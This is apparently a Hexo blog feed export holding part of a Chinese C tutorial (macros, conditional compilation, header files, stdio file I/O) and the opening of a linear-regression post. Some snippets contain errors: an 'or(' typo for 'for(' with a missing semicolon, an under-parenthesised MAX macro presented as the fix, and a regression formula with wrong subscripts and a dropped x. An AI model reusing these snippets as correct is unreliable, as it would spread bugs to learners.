传递了指针和类型，但是范围要单独传递</span></span><br><span class="line"><span class="comment">//常规写法：</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disArray2</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> length)</span></span>;</span><br><span class="line">disArray2(arr,<span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(arr[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure><ul><li>传递二维数组</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式一</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dis2Array</span><span class="params">(<span class="keyword">int</span>* arr[<span class="number">4</span>],<span class="keyword">int</span> length)</span></span>;</span><br><span class="line">dis2Array(arr,<span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(arr[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure><h4 id="函数调用"><a class="markdownIt-Anchor" href="#函数调用"></a> 函数调用</h4><ul><li>所有函数都是平行的，即在定义函数时是分别进行的，是互相独立的。函数间可以互相调用。常见有，平行调用，嵌套调用。</li><li>其他函数可以调用main函数，或者递归不退出，这都会引起栈溢出。</li></ul><h1 id="预处理"><a class="markdownIt-Anchor" href="#预处理"></a> 预处理</h1><h2 id="宏macro"><a class="markdownIt-Anchor" href="#宏macro"></a> 宏(Macro)</h2><h3 id="宏常量"><a class="markdownIt-Anchor" href="#宏常量"></a> 宏常量</h3><ul><li>#define 定义的宏，只能在一行内表达(换行符表示结束而非空格)，如果想多行表达，则需要加续行符。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14\</span></span><br><span class="line"><span class="number">15926</span></span><br></pre></td></tr></table></figure><h3 id="宏类型"><a class="markdownIt-Anchor" href="#宏类型"></a> 宏类型</h3><ul><li>宏可以给类型起别名，因其缺点，常被 typedef 取代</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHARP char *</span></span><br></pre></td></tr></table></figure><h3 id="宏函数"><a class="markdownIt-Anchor" href="#宏函数"></a> 宏函数</h3><ul><li>我们常将短小精悍的函数进行宏化，这样可以嵌入到代码中，减少调用的开销。但是代价就是，编译出的文件可能会变大。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S(a,b) a*b</span></span><br></pre></td></tr></table></figure><ul><li>define 是个演技高超的替身演员。 要搞定它其实很简单，别吝啬括号就行了。防止替换后使得结果错误</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(a,b) (a&gt;b)?a:b</span></span><br></pre></td></tr></table></figure><ul><li>尽量少用宏函数，能看的懂别人写的宏函数即可。C++中的 inline 函数己经取代了宏函数作用。</li></ul><h3 id="取消宏"><a class="markdownIt-Anchor" href="#取消宏"></a> 取消宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> MAX</span></span><br></pre></td></tr></table></figure><h2 id="条件编译condition-compile"><a class="markdownIt-Anchor" href="#条件编译condition-compile"></a> 条件编译(Condition Compile)</h2><ul><li>依据条件，判断哪些程序段参与编译</li></ul><h3 id="单-双-多路if-ifdef-ifndef-elif-else-endif"><a class="markdownIt-Anchor" href="#单-双-多路if-ifdef-ifndef-elif-else-endif"></a> 单、双、多路(#if /#ifdef / #ifndef #elif #else #endif)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> X86 <span class="comment">// #ifndef</span></span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;xxxxxxx\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">// #else</span></span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;oooooooo\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="编译期指定宏-gcc-d"><a class="markdownIt-Anchor" href="#编译期指定宏-gcc-d"></a> 编译期指定宏 gcc -D</h3><ul><li>-D name, Predefine name as a macro, with definition 1.</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;gcc 的-D 选项测试\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">//QMAKE_CFLAGS += -D DEBUG 在命令行添加这个就可以定义宏</span></span><br></pre></td></tr></table></figure><h2 id="其他宏运算符"><a class="markdownIt-Anchor" href="#其他宏运算符"></a> 其他宏运算符</h2><h3 id="运算符利用宏创建字符串"><a class="markdownIt-Anchor" href="#运算符利用宏创建字符串"></a> 运算符——利用宏创建字符串</h3><ul><li>将替换符 字符串化，解决字符串中，不可被替换的参数问题。字符串如下的书写也是合理的。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;china &quot;</span><span class="string">&quot;is &quot;</span><span class="string">&quot;great&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//#define str(x) &quot;aaaaaaaaxaaaaaaaaa&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> str(x) <span class="meta-string">&quot;aaaaaaaa&quot;</span>#x<span class="meta-string">&quot;aaaaaaaaa&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str(<span class="number">100</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PSQR(x) printf(<span class="meta-string">&quot;the sqr of &quot;</span>#x<span class="meta-string">&quot;= %d\n&quot;</span>,(x)*(x))</span></span><br><span class="line">PSQR(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><ul><li>引号中的字符串中的 x 被看作普通的文本，而不是被看作一个可被替换的语言符号。#号用作一个预处理运算符，它可以把待替换符转化为字符串</li></ul><h3 id="运算符预处理的粘和剂"><a class="markdownIt-Anchor" href="#运算符预处理的粘和剂"></a> 运算符——预处理的粘和剂</h3><ul><li>解决了，参数变量与宏展开，无法一一对应的问题。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//#define sum(a,b) (aa+bb)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sum(a,b) (a##a+b##b)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,sum(<span class="number">2</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure><h3 id="预定义宏"><a class="markdownIt-Anchor" href="#预定义宏"></a> 预定义宏</h3><table><thead><tr><th>宏名</th><th>说明</th></tr></thead><tbody><tr><td><strong>DATE</strong></td><td>进行预处理的日期（“MMmm dd yyyy”形式的字符串文字）</td></tr><tr><td><strong>FILE</strong></td><td>代表当前源代码文件名的字符串文字</td></tr><tr><td><strong>LINE</strong></td><td>代表当前源代码中的行号的整数常量</td></tr><tr><td><strong>TIME</strong></td><td>源文件编译时间，格式“hh：mm：ss”</td></tr><tr><td><strong>func</strong></td><td>当前所在函数名</td></tr></tbody></table><ul><li>在打印调试信息时打印这两个宏<code>__FILE__</code>, <code>__LINE__</code>可以给开发者非常有用的提示。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;The file is%s.\n&quot;</span>,__FILE__); <span class="comment">// _ _</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;The date is %s.\n&quot;</span>,__DATE__);</span><br><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;The time is %s.\n&quot;</span>,__TIME__);</span><br><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;This is line %d.\n&quot;</span>,__LINE__);</span><br></pre></td></tr></table></figure><h1 id="多文件编程"><a class="markdownIt-Anchor" href="#多文件编程"></a> 多文件编程</h1><ul><li>多文件编程可以至少有两大好处，一是，方便管理，协同开发。二是，便于分享与加密(作成函数库)。</li><li>c 语言是以文件为单位进行编译的，编译期只需要函数声明即可。链接阶段提供实现就可以完成生成可执行文件。</li></ul><p><img src="/images/pasted-48.png" alt=".c文件的编译连接" /></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//-std=c99编译不连接，仅生成main.o、mystr.o</span><br><span class="line">gcc -c main.s -o main.o -std=c99</span><br><span class="line">gcc -c mystr.s -o mystr.o -std=c99</span><br></pre></td></tr></table></figure><h2 id="函数声明h"><a class="markdownIt-Anchor" href="#函数声明h"></a> 函数声明(.h)</h2><ul><li>.c 文件中存在相互调用的关系，自包含可以免去了多余的前向声明。</li><li>避免头文件的额重复包含的代码</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __MYSTR_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MYSTR_H__ <span class="comment">//避免头文件重复包含</span></span></span><br><span class="line"><span class="comment">//声明的内容</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="函数实现c"><a class="markdownIt-Anchor" href="#函数实现c"></a> 函数实现(.c)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;mystr.h&quot;</span> <span class="comment">//自包含</span></span></span><br></pre></td></tr></table></figure><h2 id="头文件包含include"><a class="markdownIt-Anchor" href="#头文件包含include"></a> 头文件包含#include</h2><ul><li>全写入，被包含的文件中。包含是支持嵌套的。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;mystr.h&quot;</span> <span class="comment">//谁用谁包含</span></span></span><br></pre></td></tr></table></figure><ul><li>包含的方式<ul><li><code>#include&lt;stdio.h&gt;</code>，从系统指定路径中搜索包含头文件，linux 中的系统路径为<code>/usr/include</code></li><li><code>#include“myString.h”</code>，从工程当前路径中搜索包含头文件，如果当前工程路径下没有的话，则到系统路径下搜索包含。</li></ul></li></ul><h1 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h1><ul><li>Unix 的设计哲学之一，就是 Everything is a file。</li></ul><h2 id="文件流"><a class="markdownIt-Anchor" href="#文件流"></a> 文件流</h2><h3 id="文件流概念"><a class="markdownIt-Anchor" href="#文件流概念"></a> 文件流概念</h3><ul><li>C 语言把文件看作是一个字符的序列，即文件是由一个一个字符组成的字符流，因 此 c 语言将文件也称之为文件流。即，当读写一个文件时，可以不必关心文件的格式或结构。</li></ul><h3 id="文件类型"><a class="markdownIt-Anchor" href="#文件类型"></a> 文件类型</h3><ul><li><p>大家都知道计算机的存储，物理上是二进制的，所以文本文件与二进制文件的区别并不是物理上的，而是逻辑上的。这两者只是在编码层次上有差异。简单来说，文本文件是基于字符编码的文件，常见的编码有 ASCII 编码，二进制文件是基于值编码的文件。</p><ul><li>文本文件：以 ASCII 码格式存放，一个字节存放一个字符。 文本文件的每一个字节存放一个 ASCII 码，代表一个字符。这便于对字符的逐个处理，但占用存储空间较多，而且要花费时间转换。</li><li>二进制文件：以值（补码）编码格式存放。二进制文件是把数据以二进制数的格式存放在文件中的，其占用存储空间较少。数据按其内存中的存储形式原样存放。</li></ul></li><li><p>文本工具打开文件的过程：拿记事本来说，它首先读取文件物理上所对应的二进制比特流，然后按照你所选择的解码方式来解释这个流，然后将解释结果显示出来。一般来说，你选取的解码方式会是 ASCII 码形式（ASCII 码的一个字符是 8 个比特），接下来，每 8 个比特 8 个比特地来解释这个文件流。</p></li><li><p>二进制与文本转化查看工具</p></li></ul><table><thead><tr><th>windows</th><th>linux</th></tr></thead><tbody><tr><td>UltraEdit</td><td>hexdump -c -C -x -o</td></tr></tbody></table><h3 id="文件缓冲"><a class="markdownIt-Anchor" href="#文件缓冲"></a> 文件缓冲</h3><ul><li>有缓冲区（buffer）的原因：<ul><li>从内存中读取数据比从文件中读取数据要快得多。</li><li>对文件的读写需要用到 open、read、write 等系统底层函数，而用户进程每调用一次系统函数都要从用户态切换到内核态，等执行完毕后再返回用户态，这种切换要花费一定时间成本（对于高并发程序而言，这种状态的切换会影响到程序性能）</li></ul></li></ul><h2 id="文件的打开和关闭"><a class="markdownIt-Anchor" href="#文件的打开和关闭"></a> 文件的打开和关闭</h2><h3 id="file-结构体"><a class="markdownIt-Anchor" href="#file-结构体"></a> FILE 结构体</h3><ul><li>FILE 结构体是对缓冲区和文件读写状态的记录者，所有对文件的操作，都是通过FILE 结构体完成的。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> <span class="keyword">short</span> level; <span class="comment">/* 缓冲区满/空程度 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> flags; <span class="comment">/* 文件状态标志 */</span></span><br><span class="line"> <span class="keyword">char</span> fd; <span class="comment">/* 文件描述符 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> hold; <span class="comment">/* 若无缓冲区不读取字符 */</span></span><br><span class="line"> <span class="keyword">short</span> bsize; <span class="comment">/* 缓冲区大小 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer; <span class="comment">/* 数据传送缓冲区位置 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> *curp; <span class="comment">/* 当前读写位置 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> istemp; <span class="comment">/* 临时文件指示 */</span></span><br><span class="line"> <span class="keyword">short</span> token; <span class="comment">/* 用作无效检测 */</span></span><br><span class="line">&#125; FILE ; <span class="comment">/* 结构体类型名 FILE */</span></span><br></pre></td></tr></table></figure><ul><li>在开始执行程序的时候，将自动打开 3 个文件和相关的流：标准输入流(stdin)、标准输出流(stdout)和标准错误(stderr)，它们都是<code>FIEL*</code>型的指针。流提供了文件和程序的通信通道。</li></ul><table><thead><tr><th>函数</th><th>所在文件</th><th>功能</th></tr></thead><tbody><tr><td><code>FILE * fopen ( const char * filename, const char * mode );</code></td><td>stdio.h</td><td>以 mode 的方式，打开一个 filename 命名的文件，返回一个指向该文件缓冲的 FILE 结构体指针。</td></tr><tr><td><code>int fclose ( FILE * stream );</code></td><td>stdio.h</td><td>fclose()用来关闭先前 fopen()打开的文件. 此动作会让缓冲区内的数据写入文件中, 并释放系统所提供的文件资源。主动刷缓存，防止意外退出，系统未正确退出来不及刷新。</td></tr><tr><td><code>int fputc (int ch, FILE * stream );</code></td><td>stdio.h</td><td>将 ch 字符，写入文件。写入失败返回EOF</td></tr><tr><td><code>int fgetc ( FILE * stream );</code></td><td>stdio.h</td><td>从文件流中读取一个字符并返回。</td></tr><tr><td><code>int feof( FILE * stream );</code></td><td>stdio.h</td><td>判断文件是否读到文件结尾</td></tr><tr><td><code>int fputs(char *str,FILE *fp)</code></td><td>stdio.h</td><td>把 str 指向的字符串写入 fp 指向的文件中。</td></tr><tr><td><code>char *fgets(char *str,int length,FILE *fp)</code></td><td>stdio.h</td><td>从 fp 所指向的文件中，至多读 length-1 个字符，送入字符数组 str中， 如果在读入 length-1 个字符结束前遇\n 或 EOF，读入即结束，字符串读入后在最后加一个‘\0’字符。<br>fgets 函数返回有三个条件：<br>1-读 n-1 个字符前遇到\n，读取结束(\n 被读取) + \0。 <br>2-读 n-1 个字符前遇到 EOF，读取结束 +\0。 <br>3-读到 n-1 个符+\0。</td></tr><tr><td><code>int fwrite(void *buffer, int num_bytes, int count, FILE *fp)</code></td><td>stdio.h</td><td>把 buffer 指向的数据写入fp 指向的文件中</td></tr><tr><td><code>int fread(void *buffer, int num_bytes, int count, FILE *fp)</code></td><td>stdio.h</td><td>把 fp 指向的文件中的数据读到 buffer 中。</td></tr><tr><td><code>rewind()</code></td><td>stdio.h</td><td>文件指针回退文件开头</td></tr><tr><td><code>long ftell ( FILE * stream );</code></td><td>stdio.h</td><td>得到流式文件的当前读写位置,其返回值是当前读写位置偏离文件头部的字节数.</td></tr><tr><td><code>int fseek ( FILE * stream, long offset, int where);</code></td><td>stdio.h</td><td>偏移文件指针。<br>常见的起始位置有宏定义：<br>#define SEEK_CUR 1 当前位置<br>#define SEEK_END 2 文件结尾<br>#define SEEK_SET 0 文件开头</td></tr><tr><td>``</td><td>stdio.h</td><td></td></tr><tr><td>``</td><td>stdio.h</td><td></td></tr></tbody></table><table><thead><tr><th>mode值</th><th>处理方式</th><th>文件不存在时</th><th>文件存在时</th><th>向文件输入</th><th>向文件输出</th></tr></thead><tbody><tr><td>r</td><td>读 取</td><td>出错</td><td>打开文件</td><td>不能</td><td>可以</td></tr><tr><td>w</td><td>写 入</td><td>新建</td><td>覆盖源文件</td><td>可以</td><td>不能</td></tr><tr><td>a</td><td>追 加</td><td>新建</td><td>源文件新加</td><td>可以</td><td>不能</td></tr><tr><td>r+</td><td>读/写</td><td>出错</td><td>打开文件</td><td>可以</td><td>可以</td></tr><tr><td>w+</td><td>写/读</td><td>新建</td><td>覆盖源文件</td><td>可以</td><td>可以</td></tr><tr><td>a+</td><td>读/追</td><td>新建</td><td>源文件新加</td><td>可以</td><td>可以</td></tr></tbody></table><ul><li>如果读写的是二进制文件，则还要加b,比如rb, r+b等。unix/linux不区分文本和二进制文件。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> FILE* fp = fopen(<span class="string">&quot;ascii.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">char</span> ch = <span class="string">&#x27;a&#x27;</span>; ch&lt;=<span class="string">&#x27;z&#x27;</span>; ch++)</span><br><span class="line"> &#123;</span><br><span class="line"> fputc(ch,fp);</span><br><span class="line"> &#125;</span><br><span class="line"> rewind(fp);</span><br><span class="line"> <span class="keyword">char</span> ch;</span><br><span class="line"> <span class="keyword">while</span>((ch = fgetc(fp))&amp;&amp; !feof(fp)) <span class="comment">//这才是正确的姿势</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%3c&quot;</span>,ch);</span><br><span class="line"> &#125;</span><br><span class="line"> fclose(fp);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>fread、fwrite可以按照二进制的方式，读取或者写入数据，而不会被EOF、0等符号影响。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> FILE *fpw = fopen(<span class="string">&quot;bin.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(fpw == <span class="literal">NULL</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> <span class="keyword">char</span> *p = <span class="string">&quot;china \n is \0 great&quot;</span>;</span><br><span class="line"> fwrite(p,<span class="number">1</span>,<span class="built_in">strlen</span>(p)+<span class="number">6</span>,fpw);</span><br><span class="line"> fclose(fpw);</span><br><span class="line"> FILE * fpr = fopen(<span class="string">&quot;bin.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(fpr == <span class="literal">NULL</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"> <span class="keyword">int</span> n;</span><br><span class="line"> n = fread(buf,<span class="number">1</span>,<span class="number">1024</span>,fpr);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;n = %d\n&quot;</span>,n);</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%#x\n&quot;</span>,buf[i]);</span><br><span class="line"> &#125;</span><br><span class="line"> rewind(fpr);</span><br><span class="line"> <span class="keyword">char</span> read[<span class="number">10</span>];</span><br><span class="line"> <span class="keyword">while</span>((n=fread((<span class="keyword">void</span>*)read,<span class="number">1</span>,<span class="number">3</span>,fpr))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">or</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,read[i])</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> fclose(fpr);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>feof 这个函数，是去读标志位判断文件是否结束的。即在读到文件结尾的时候再去读一次，标志位才会置位，此时再来作判断文件处理结束状态，文件到结尾。如果用于打印，则会出现多打一次的的现象。</li><li>EOF的值为-1。</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性回归</title>
      <link href="/2020/06/27/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
      <url>/2020/06/27/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>线性模型是机器学习里面最基础的一个模型，也是比较简单的</p></blockquote><a id="more"></a><ul><li>线性模型主要用于属于线性关系的模型，像<code>y=wx+b</code>，就是只有一个属性<code>x</code>表示的<code>y</code>值的变化规律，也称做单属性线性回归。</li></ul><h2 id="基本形式"><a class="markdownIt-Anchor" href="#基本形式"></a> 基本形式</h2><ul><li>当给定d个属性示例<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">;</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>d</mi></msub></mrow></mrow><annotation encoding="application/x-tex">x={x_1;x_2....x_d}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>，线性模型视图学得一个属性的线性组合来进行预测：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>w</mi><mn>1</mn></msub><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>w</mi><mn>2</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msub><mi>w</mi><mn>3</mn></msub><msub><mi>x</mi><mn>4</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>w</mi><mi>d</mi></msub><msub><mi>x</mi><mi>d</mi></msub><mo>+</mo><mi>b</mi><mo>=</mo><msup><mi>w</mi><mi>T</mi></msup><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">f(x)=w_1x_1+w_2x_2+w_3x_4+...w_dx_d+b=w^T+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 